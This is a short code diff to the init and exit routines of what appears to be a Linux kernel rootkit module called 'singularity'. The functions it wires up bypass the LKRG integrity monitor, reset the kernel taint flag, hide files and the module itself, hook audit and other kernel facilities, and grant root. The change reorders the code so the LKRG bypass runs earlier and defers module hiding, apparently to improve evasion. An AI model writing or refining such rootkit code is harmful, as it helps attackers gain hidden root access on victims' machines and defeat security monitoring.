@@ -122,6 +122,9 @@ static int __init singularity_init(void)
     ret = sd_bootstrap_kprobe_hook();
     if (ret) return ret;
 
+    ret = lkrg_bypass_init();
+    if (ret) return ret;
+
     sd_snapshot_all();
 
     ret = selfdefense_init();
@@ -129,7 +132,6 @@ static int __init singularity_init(void)
 
     ret |= reset_tainted_init();
     ret |= hiding_open_init();
-    ret |= lkrg_bypass_init();
     ret |= become_root_init();
     ret |= hiding_directory_init();
     ret |= hiding_stat_init();
@@ -145,12 +147,13 @@ static int __init singularity_init(void)
     ret |= taskstats_hook_init();
     ret |= sysrq_hook_init();
 
-    module_hide_current();
+    module_hide_current_deferred();
     return ret;
 }
 
 static void __exit singularity_exit(void)
 {
+    module_hide_cancel_deferred();
     sysrq_hook_exit();
     taskstats_hook_exit();
     hooking_audit_exit();
@@ -165,10 +168,10 @@ static void __exit singularity_exit(void)
     hiding_stat_exit();
     hiding_directory_exit();
     become_root_exit();
-    lkrg_bypass_exit();
     hiding_open_exit();
     reset_tainted_exit();
     selfdefense_exit();
+    lkrg_bypass_exit();
 }
 
 module_init(singularity_init);
